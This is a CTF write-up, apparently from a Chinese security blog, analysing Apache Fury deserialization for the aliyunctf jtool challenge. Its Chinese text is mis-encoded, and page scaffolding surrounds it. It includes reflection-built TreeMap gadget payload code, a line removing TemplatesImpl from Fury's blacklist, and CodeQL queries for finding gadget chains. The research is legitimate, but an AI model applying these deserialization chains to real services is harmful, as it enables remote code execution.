TreeMap.put(test1,2); // setFieldValue(TreeMap,\"comparator\", propertyComparator); // TreeMap.put(1234,123); // TreeMap.put(1234,123); // root = new TreeMap.Entry\u003c\u003e(\"key\", \"value\", null); Constructor\u003c?\u003e declaredConstructor = Class.forName(\"java.util.TreeMap$Entry\").getDeclaredConstructors()[0]; declaredConstructor.setAccessible(true); Object root_test1 = declaredConstructor.newInstance( test1, 2, null); Field root = TreeMap.getClass().getDeclaredField(\"root\"); root.setAccessible(true); Object Troot = root.get(TreeMap); Field left = Troot.getClass().getDeclaredField(\"right\"); left.setAccessible(true); left.set(Troot, root_test1); root.set(TreeMap, Troot); setFieldValue(TreeMap,\"size\",2); setFieldValue(TreeMap,\"modCount\",2); // TreeMap.put(test1,1232); // BiMap hashMap = new BiMap(hashMap1); Fury fury = Fury.builder().withLanguage(Language.JAVA) .requireClassRegistration(false) .build(); byte[] serialize = fury.serialize(TreeMap); Object deserialize = fury.deserialize(serialize); } } å·®ä¸å¤šå°±å…ˆè¿™æ ·å§\nå…¶å®æˆ‘qlæœ€åˆè·¯èµ°åäº†ï¼Œç„¶åæˆ‘å°±åƒé€šè¿‡callè¿™ç§å‘ä¸Šæ‰¾ï¼ˆconverté‚£ä¸ªç‚¹ï¼‰ï¼Œä¸ºä»€ä¹ˆä¸ç”¨tabbyå‘¢ï¼ˆæˆ‘æ‰¾å‡ºæ¥å¾ˆä¸å…¨ï¼‰ï¼Œ\nç„¶åæˆ‘å°±å»æ‰¾AbstractConverter#convertä¼šæœ‰å“ªäº›è°ƒç”¨åˆ°ï¼Œä½†æ˜¯å§‹ç»ˆæ‰¾ä¸å…¨ï¼Œideaæ˜¯æœ‰16ä¸ªï¼Œtabby8ä¸ªï¼Œqlå§‹ç»ˆæ˜¯åªæœ‰13ä¸ªã€‚ç„¶åå»çœ‹qlæ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´çš„ã€‚å‘ç°æœ‰ä¸ªç‚¹ä½åº”è¯¥è¢«æ‰¾åˆ°çš„ä½†æ˜¯ç»“æœé‡Œé¢æ²¡æœ‰ï¼ˆè§ä¸‹å›¾ï¼‰ï¼ŒDateConverter.convertè¿™ä¸ªç‚¹å’Œä¸‹é¢TemporalAccessorConverterè¿™ä¸ªæ¡ä»¶è‚¯å®šæ˜¯ä¸€æ ·çš„ã€‚DateConverteræ˜¯ç»§æ‰¿AbstractConverteræ˜¯ç¬¦åˆçš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰¾ä¸åˆ°ï¼Œç„¶åæ‰¾äº†å¯¹åº”çš„ç±»NumberWithFormatæ‰€æœ‰çš„callerç‚¹ï¼Œä¹Ÿæ˜¯æ²¡DateConverter.convertï¼ˆæ„Ÿè§‰æ˜¯æ•°æ®åº“ç”ŸæˆèŠ‚ç‚¹çš„é—®é¢˜å•Šï¼Œæœ‰å¤§å“¥æ‡‚çš„ï¼Œè§£ç­”ä¸‹å°å¼Ÿï¼‰\nimport java from RefType abstractConverter, RefType subclass,Method m,MethodCall mcall where (abstractConverter.getQualifiedName().matches(\"cn.hutool.core.convert.Converter\u003c%\") or abstractConverter.getQualifiedName().matches(\"cn.hutool.core.convert.Converter\") )and subclass.getASupertype*() = abstractConverter and m.getDeclaringType()=subclass and m.hasName(\"convert\") and mcall.getMethod()=m and (m.getDeclaringType().getQualifiedName().matches(\"cn.hutool.core.convert.Converter%\") or m.getDeclaringType().getQualifiedName().matches(\"cn.hutool.core.convert.AbstractConverter%\")) select m,m.getDeclaringType(),mcall,mcall.getEnclosingCallable().getDeclaringType() ",
  "wordCount" : "4303",
  "inLanguage": "zh",
  "datePublished": "2025-04-27T20:01:23+08:00",
  "dateModified": "2025-07-02T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/chain/fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96aliyunctf-jtool/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="é¦–é¡µ">
                    <span>é¦–é¡µ</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="åˆ†ç±»">
                    <span>åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="æœç´¢ğŸ”ï¸">
                    <span>æœç´¢ğŸ”ï¸</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">ğŸ ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      Furyååºåˆ—åŒ–&amp;aliyunctf-jtool
    </h1>
    <div class="post-meta"><span title='2025-04-27 20:01:23 +0800 CST'>2025-04-27</span>&nbsp;Â·&nbsp;9 åˆ†é’Ÿ&nbsp;Â·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">ç›®å½•</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#0x01-%e5%ba%8f%e5%88%97%e5%8c%96%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96-%e9%80%bb%e8%be%91" aria-label="0x01 åºåˆ—åŒ–&amp;amp;ååºåˆ—åŒ– é€»è¾‘">0x01 åºåˆ—åŒ–&amp;ååºåˆ—åŒ– é€»è¾‘</a></li>
                    <li>
                        <a href="#0x02-%e5%8a%a8%e6%80%81%e7%94%9f%e6%88%90%e7%9a%84serializer" aria-label="0x02 åŠ¨æ€ç”Ÿæˆçš„serializer">0x02 åŠ¨æ€ç”Ÿæˆçš„serializer</a></li>
                    <li>
                        <a href="#0x03-%e9%93%be%e5%ad%90%e6%9f%a5%e6%89%be" aria-label="0x03 é“¾å­æŸ¥æ‰¾">0x03 é“¾å­æŸ¥æ‰¾</a><ul>
                            
                    <li>
                        <a href="#sink%e7%82%b9" aria-label="sinkç‚¹">sinkç‚¹</a></li>
                    <li>
                        <a href="#source%e7%82%b9" aria-label="sourceç‚¹">sourceç‚¹</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><blockquote>
<p>å‰è¨€ï¼šå½“æ—¶çœ‹ä¸æ‡‚è¿™ä¸ªï¼Œæ— æ„é—´çœ‹äº†ä¸‹<code>hessianååºåˆ—åŒ–</code>ï¼Œç„¶åå°±æœ‰æƒ³æ³•å’Œæ€è·¯äº†ï¼Œç„¶åçœ‹ç½‘ä¸Šæ–‡ç« ä¹Ÿæ˜¯æ²¡æœ‰çœ‹åˆ°é‚£ä¸ªæŠŠè¿™ä¸ªè®²æ˜ç™½çš„ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘çœ‹å¾—å°‘hhhï¼‰</p>
</blockquote>
<blockquote>
<p>è¿™ç±»éå¸¸è§„ååºåˆ—åŒ–ï¼Œå°±æ˜¯æŸ¥çœ‹ä»–<code>åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„é€»è¾‘</code>ï¼Œç„¶åæ‰¾<code>å¯ä»¥åˆ©ç”¨çš„æ–¹æ³•</code>æœ‰å“ªäº›ç„¶åä½œä¸º<code>é“¾å­çš„å¼€å¤´</code>ï¼ˆè®²çš„æœ‰ç‚¹ç¬¼ç»Ÿï¼Œä¸‹é¢æ¥ç‚¹å®é™…çš„</p>
</blockquote>
<p>ç¯å¢ƒï¼šç”¨åˆ°aliyunctf-jtoolsçš„jaråŒ…ï¼Œä¸‹è½½é“¾æ¥æ¯”èµ›å®˜ç½‘åº”è¯¥è¿˜æœ‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">calc</span><span class="w"> </span><span class="n">calc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">calc</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">HashMap</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">hashMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;val&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">calc</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Fury</span><span class="w"> </span><span class="n">fury</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Fury</span><span class="p">.</span><span class="na">builder</span><span class="p">().</span><span class="na">withLanguage</span><span class="p">(</span><span class="n">Language</span><span class="p">.</span><span class="na">JAVA</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="na">requireClassRegistration</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="na">build</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">serialize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fury</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">hashMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Fury</span><span class="w"> </span><span class="n">ser_fury</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Fury</span><span class="p">.</span><span class="na">builder</span><span class="p">().</span><span class="na">withLanguage</span><span class="p">(</span><span class="n">Language</span><span class="p">.</span><span class="na">JAVA</span><span class="p">).</span><span class="na">requireClassRegistration</span><span class="p">(</span><span class="kc">false</span><span class="p">).</span><span class="na">build</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Object</span><span class="w"> </span><span class="n">deserialize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ser_fury</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">serialize</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>è¿™ä¸ªæ˜¯æˆ‘æœ€åˆçš„ä¸€ä¸ªdemo</p>
<h2 id="0x01-åºåˆ—åŒ–ååºåˆ—åŒ–-é€»è¾‘">0x01 åºåˆ—åŒ–&amp;ååºåˆ—åŒ– é€»è¾‘<a hidden class="anchor" aria-hidden="true" href="#0x01-åºåˆ—åŒ–ååºåˆ—åŒ–-é€»è¾‘">#</a></h2>
<ul>
<li><strong>ååºåˆ—åŒ–</strong></li>
</ul>
<p>ç›´æ¥çœ‹æ˜¯æ€ä¹ˆååºåˆ—åŒ–çš„å§ï¼Œ<code>æ­£å¸¸ååºåˆ—åŒ–å¯¹è±¡</code>ï¼Œä¼šåˆ°è¿™ä¸ª<code>default:</code>ä¸­ï¼ˆè°ƒè¯•åˆ°ä¸‹å›¾ï¼Œå‰é¢çš„åœ°æ–¹æˆ‘å°±æ²¡è®°å½•ï¼Œæ„Ÿè§‰è®°å¤šäº†ï¼Œæ–‡ç« æŒº<strong>è‡ƒè‚¿</strong>ï¼Œçœ‹å¾—çƒ¦ï¼‰ï¼Œç„¶åè°ƒç”¨æ¯ä¸ªå¯¹è±¡çš„<code>ClassInfo</code>ä¸­è®¾ç½®çš„<code>serializer#read</code>æ–¹æ³•è¿›è¡Œ<code>è¿˜åŸè¿™ä¸ªå¯¹è±¡</code>ï¼Œç„¶åä¸Šé¢è¿˜æœ‰ä¸€äº›case æˆ‘ç®€å•çœ‹äº†æ²¡ä»€ä¹ˆæ“ä½œç©ºé—´ï¼Œéƒ½æ˜¯<code>è¿˜åŸä¸€äº›å¸¸ç”¨ç±»å‹</code>ï¼ˆintä»€ä¹ˆçš„ï¼‰ï¼Œè€Œè¿™ä¸ª<code>serializer</code>æ˜¯åœ¨<code>åºåˆ—åŒ–</code>ä¸­è®¾ç½®çš„ï¼Œé‚£æˆ‘ä»¬å»çœ‹çœ‹åºåˆ—åŒ–å§</p>
<p><img loading="lazy" src="../images/image-20250321090424683.png" alt="image-20250321090424683"  />
</p>
<ul>
<li><strong>åºåˆ—åŒ–</strong></li>
</ul>
<p>Furyæœ‰ä¸€ä¸ªmapå­˜å‚¨äº†<code>ä¸€äº›ç±»çš„ClassInfo</code>ï¼Œè¿™é‡Œç±»ï¼Œåºåˆ—åŒ–çš„æ—¶å€™ä¼šç›´æ¥ä»è¿™ä¸ª<code>mapè·å–</code>å±äºè‡ªå·±çš„ClassInfo</p>
<p><img loading="lazy" src="../images/image-20250321091433160.png" alt="image-20250321091433160"  />
</p>
<p><img loading="lazy" src="../images/image-20250321091740429.png" alt="image-20250321091740429"  />
</p>
<p>ç„¶åçœ‹åˆ°æœ‰<code>86å¯¹å€¼</code>ï¼Œä¹Ÿå°±æ˜¯æœ‰<code>86ä¸ªreadæ–¹æ³•</code>å¯ä»¥æŸ¥çœ‹<code>ç›¸å…³çš„ä»£ç é€»è¾‘</code>æœ‰æ²¡æœ‰å¯ä»¥<code>åˆ©ç”¨çš„ç‚¹ï¼ˆé“¾å­èµ·ç‚¹ï¼‰</code></p>
<p>å½“ç„¶é™¤äº†mapä¸­è®°å½•ä¹‹å¤–çš„ç±»ï¼ŒFuryä¹Ÿä¼šç”Ÿæˆ<code>serializer</code>ä¸ºå…¶<code>å®ç°åºåˆ—åŒ–</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="na">addSerializer</span><span class="p">(</span><span class="n">cls</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">createSerializer</span><span class="p">(</span><span class="n">cls</span><span class="p">));</span><span class="w">
</span></span></span></code></pre></div><p>è·Ÿè¿›<code>this.createSerializer</code>ï¼Œç„¶åä¸€ç›´åˆ°<code>getSerializerClass()</code></p>
<p>è¿™é‡Œä¼šå¯¹è¦åºåˆ—åŒ–çš„classè¿›è¡Œä¸€äº›<code>æ£€æµ‹</code>ï¼Œç„¶ååœ¨è°ƒç”¨<code>this.getObjectSerializerClass()</code>è·å–<code>Serializerçš„class</code>ï¼Œè¿™é‡Œæ£€æµ‹æˆ‘ä¸»è¦å…³æ³¨äº†<code>Serializable.class</code>è¿™ä¸ªç‚¹ï¼Œè¿˜æœ‰<code>requireJavaSerialization()</code>è¿™ä¸ªæ˜¯å› ä¸ºé‡Œé¢æœ‰å…³äº<code>Serializable.class</code>çš„åˆ¤æ–­ï¼Œç„¶åå‘ç°åªè¦class<code>ä¸æ˜¯ä»¥javaå¼€å¤´</code>å³ä½¿<code>æ²¡ç»§æ‰¿Serializable.class</code>ä¹Ÿå¯ä»¥è¢«Furyååºåˆ—åŒ–ï¼Œ<code>åˆæ­¥æ¨æ–­</code>Furyæ˜¯å¯ä»¥ååºåˆ—åŒ–<code>æ²¡ç»§æ‰¿Serializable.class</code>çš„<code>ç±»</code></p>
<p><img loading="lazy" src="../images/image-20250321094021212.png" alt="image-20250321094021212"  />
</p>
<p>ç„¶åè·Ÿ<code>this.getObjectSerializerClass()</code></p>
<p><img loading="lazy" src="../images/image-20250321095055995.png" alt="image-20250321095055995"  />
</p>
<p>å…ˆä¼šæœ‰ä¸€ä¸ª<code>checkNotInDisallowedList()</code>é»‘åå•æ£€æµ‹ï¼Œåé¢ç»§ç»­è°ƒè¯•</p>
<p><img loading="lazy" src="../images/image-20250321101717880.png" alt="image-20250321101717880"  />
</p>
<p>ä¸‹é¢è¿™ä¸ªåœ°æ–¹è·Ÿè¿›å»</p>
<p><img loading="lazy" src="../images/image-20250321095322029.png" alt="image-20250321095322029"  />
</p>
<p>ç„¶ååˆ°ä¸‹é¢è¿™ä¸ª<code>classLoader.loadClass</code>ï¼Œä¸ºä»€ä¹ˆè¦è·Ÿè¿™ä¸ªåœ°æ–¹ç­‰ä¸‹å°±çŸ¥é“äº†</p>
<p><img loading="lazy" src="../images/image-20250321095438668.png" alt="image-20250321095438668"  />
</p>
<h2 id="0x02-åŠ¨æ€ç”Ÿæˆçš„serializer">0x02 åŠ¨æ€ç”Ÿæˆçš„serializer<a hidden class="anchor" aria-hidden="true" href="#0x02-åŠ¨æ€ç”Ÿæˆçš„serializer">#</a></h2>
<p>classloaderæ˜¯<code>ClassLoaderUtils$ByteArrayClassLoader</code>æ¥åŠ è½½çš„ï¼Œç„¶åä¼šåˆ°çˆ¶ç±»çš„loadClassæ–¹æ³•ï¼Œç„¶åå†åˆ°ä¸‹å›¾çš„<code>findClass()</code> <code>ç”Ÿæˆclass</code></p>
<p><img loading="lazy" src="../images/image-20250321095929583.png" alt="image-20250321095929583"  />
</p>
<p>ä»–è¿™ä¸ª<code>serializer</code>æ˜¯<strong>åŠ¨æ€ç”Ÿæˆ</strong>ï¼Œåˆ°æ—¶å€™æˆ‘ä»¬è°ƒè¯•æ˜¯<strong>è°ƒè¯•ä¸äº†</strong><code>å…¶read()æ–¹æ³•</code>çš„ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°<code>å…¶classçš„byte[]</code>ï¼Œä¸‹é¢åç»­çš„æ“ä½œï¼Œå°±æ˜¯é€šè¿‡<code>åŠ è½½byte[]ç”Ÿæˆclass</code>ç„¶åé€šè¿‡<code>åå°„( newInstance() )</code>å¾—åˆ°<code>serializerå¯¹è±¡</code></p>
<p><img loading="lazy" src="../images/image-20250321100453734.png" alt="image-20250321100453734"  />
</p>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªbyte[]ç”Ÿæˆclassæ–‡ä»¶ï¼ŒæŸ¥çœ‹å…¶ä»£ç é€»è¾‘</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="o">-</span><span class="n">54</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="n">70</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="n">66</span><span class="p">,</span><span class="w"> </span><span class="p">...};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fileOutputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;test.class&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">fileOutputStream</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">bytes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">fileOutputStream</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></div><p>è¿™é‡Œæˆ‘æ˜¯ç”Ÿæˆäº†ä¸€ä¸ª<code>TemplatesImpl.class</code>çš„<code>serializer</code>ï¼ˆä¸ºä»€ä¹ˆé€‰è¿™ä¸ªï¼Œå› ä¸ºç»å…¸çº¯ç‰›å¥¶ï¼‰</p>
<p>åœ¨è°ƒè¯•é‚£ä¸ªé»‘åå•æ£€æµ‹æ—¶ï¼Œè¿è¡Œä¸‹é¢è¿™ä¸ªå°±èƒ½ç»•è¿‡é‚£ä¸ªåœ°æ–¹ï¼Œç„¶åç”Ÿæˆæˆ‘ä»¬çš„<code>serializer</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">DEFAULT_DISALLOWED_LIST_SET</span><span class="p">.</span><span class="na">map</span><span class="p">.</span><span class="na">remove</span><span class="p">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶ååªæœ‰<code>this.readAndSetFields</code>é‡Œé¢é€»è¾‘èƒ½å®¡è®¡ä¸‹ï¼Œä½†æ˜¯åŸºæœ¬ä¸Šä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆ<code>ååºåˆ—åŒ–åå¯¹æ–¹æ³•çš„è°ƒç”¨</code>ä¹Ÿå¯èƒ½æ˜¯ç±»æ²¡é€‰å¯¹ï¼Œä½†æ˜¯é‚£ä¸ª(å°±æ˜¯è¿™ä¸ªclassæ€ä¹ˆç”Ÿæˆè¿™äº›çš„ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å†æ·±å…¥åˆ†æåˆ†æ)</p>
<p><img loading="lazy" src="../images/image-20250321103446792.png" alt="image-20250321103446792"  />
</p>
<h2 id="0x03-é“¾å­æŸ¥æ‰¾">0x03 é“¾å­æŸ¥æ‰¾<a hidden class="anchor" aria-hidden="true" href="#0x03-é“¾å­æŸ¥æ‰¾">#</a></h2>
<p>å›åˆ°ä¹‹å‰çš„86ä¸ªreadæ–¹æ³•ï¼Œè¿™é‡Œæˆ‘å…¶å®æƒ³èµ·äº†<code>hessianååºåˆ—åŒ–</code>çš„<code>hashmap</code>ï¼Œç„¶åæˆ‘ååºåˆ—åŒ–äº†ä¸€ä¸ª<code>hashmap</code></p>
<p>çœ‹åˆ°ä¸‹é¢è¿™é‡Œï¼Œä¼šå…ˆååºåˆ—åŒ–<code>key</code>å’Œ<code>value</code>ï¼Œç„¶åè¿›è¡Œmap.putï¼Œè¿™é‡Œä¸å°±èƒ½è¿›è¡Œåˆ©ç”¨äº†ä¹ˆï¼ˆå¯¹è±¡è°ƒç”¨ï¼‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">hash</span><span class="p">,</span><span class="n">hashcode</span><span class="p">,</span><span class="n">equalséƒ½èƒ½åˆ©ç”¨äº†å“‡</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20250321104749461.png" alt="image-20250321104749461"  />
</p>
<p>ç„¶åæˆ‘ä»¬åœ¨çœ‹åˆ°<code>HashMapSerializer</code>ä¸Šé¢çš„ä¸Šé¢æ˜¯<strong>ç»§æ‰¿</strong><code>AbstractMapSerializer</code>ï¼Œå…¶å†ç»§æ‰¿<code>Serializer</code></p>
<p>86ä¸ªreadæˆ‘æ€»ä¸èƒ½æŒ¨ä¸ªå»çœ‹å§ï¼Œä½†æ˜¯æˆ‘ä»¬èµ·ç‚¹å¤§è‡´å¯ä»¥è®¾ç½®ä¸º<code>ç»§æ‰¿Serializer</code>çš„<code>readæ–¹æ³•</code></p>
<p><strong>æ€è·¯</strong> è¿™é‡Œå¤§è‡´å°±ä¸¤ç§å§</p>
<ul>
<li>é€šè¿‡readä¸ºèµ·ç‚¹ï¼Œåˆ°sinkç‚¹</li>
<li>é€šè¿‡readä¸ºèµ·ç‚¹ï¼Œåˆ°<code>jdkåŸç”Ÿååºåˆ—åŒ–</code>ï¼Œreadobjectå†åˆ°sinkç‚¹</li>
</ul>
<h3 id="sinkç‚¹">sinkç‚¹<a hidden class="anchor" aria-hidden="true" href="#sinkç‚¹">#</a></h3>
<blockquote>
<p>sourceç‚¹è‡ªç„¶æ˜¯<code>ç»§æ‰¿Serializer</code>çš„<code>readæ–¹æ³•</code></p>
<p>èµ·åˆæ˜¯ç”¨tabbyå°è¯•æ‰¾é“¾å­çš„ï¼Œç„¶åæ„Ÿè§‰tabbyæ‰¾å¾—æœ‰ç‚¹åŠ›ä¸ä»å¿ƒã€‚ç„¶åå»æŠ˜è…¾qläº†,ä¹ŸæŠ˜è…¾äº†ä¼šå§ã€‚ç›¸å¯¹æ¥è¯´qlç»™æˆ‘çš„æ„Ÿè§‰ä¼šå¤æ‚å¾ˆå¤šï¼Œç„¶åè‡ªæˆ‘æ„Ÿè§‰è¿™ç¯‡æ–‡ç« åé¢å†…å®¹ä¸æ˜¯å¾ˆå¥½ï¼Œæƒ³ç€å†™ä¸€åŠäº†éƒ½ï¼Œè¿˜æ˜¯å®Œä¸ªç»“å§</p>
<p>å…ˆè®²sinkç‚¹å§ï¼Œå› ä¸ºè·Ÿæ€è·¯å¯¹åº”äº›ï¼Œæœ‰ç‚¹ç…§ç€ç­”æ¡ˆæ‰¾é“¾å­çš„æ„æ€äº†ï¼ˆè‹¦ç¬‘</p>
</blockquote>
<p>è¿™é‡Œfuryæœ¬èº«è‡ªå¸¦200+ç±»çš„è¿‡æ»¤ï¼Œç„¶åå‡ºé¢˜äººåˆåŠ äº†ä¸€ä¸ª<code>com.feilong.lib</code>çš„è¿‡æ»¤ï¼Œæ‰€ä»¥ä¹Ÿèƒ½å¾€<code>äºŒæ¬¡ååºåˆ—åŒ–</code>è¿™ä¸ªæ–¹å‘æƒ³å§</p>
